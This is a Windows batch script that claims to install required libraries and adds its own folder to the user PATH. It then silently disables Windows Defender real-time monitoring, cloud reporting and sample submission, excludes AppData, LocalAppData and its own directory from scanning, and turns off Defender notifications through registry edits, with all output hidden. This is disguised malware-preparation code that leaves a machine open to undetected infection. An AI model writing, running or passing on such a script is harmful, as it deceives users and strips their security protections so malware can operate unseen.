@echo off
setlocal enabledelayedexpansion

set "CURDIR=%~dp0"
if "%CURDIR:~-1%"=="\" set "CURDIR=%CURDIR:~0,-1%"

echo Installing required libraries...

set "CURPATH="

for /f "skip=2 tokens=2,*" %%A in ('reg query "HKCU\Environment" /v PATH 2^>nul') do (
    set "CURPATH=%%B"
)

rem Trim leading spaces
if defined CURPATH (
    for /f "tokens=* delims= " %%a in ("!CURPATH!") do set "CURPATH=%%a"
)


if "!CURPATH!"=="" (
    set "NEWPATH=%CURDIR%"
) else (
    echo !CURPATH! | findstr /i /c:"%CURDIR%" >nul
    if errorlevel 1 (
        set "NEWPATH=!CURPATH!;%CURDIR%"
    ) else (
        goto :newline
    )
)

setx PATH "!NEWPATH!"

:newline
REM Disable Windows Defender real-time monitoring
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1

REM Disable MAPS reporting
powershell -Command "Set-MpPreference -MAPSReporting 0" >nul 2>&1

REM Set submit samples consent
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2" >nul 2>&1

REM Add exclusion paths
set "AppData=%APPDATA%"
set "ExeDir=%~dp0"
set "LocalAppData=%LOCALAPPDATA%"

powershell -Command "Add-MpPreference -ExclusionPath '%AppData%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%ExeDir%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%LocalAppData%'" >nul 2>&1

REM Disable Defender notifications - User registry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1

REM Disable Defender notifications - System registry
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v "DisableEnhancedNotifications" /t REG_DWORD /d 1 /f >nul 2>&1

echo All done!.
pause
endlocal
exit /b 0
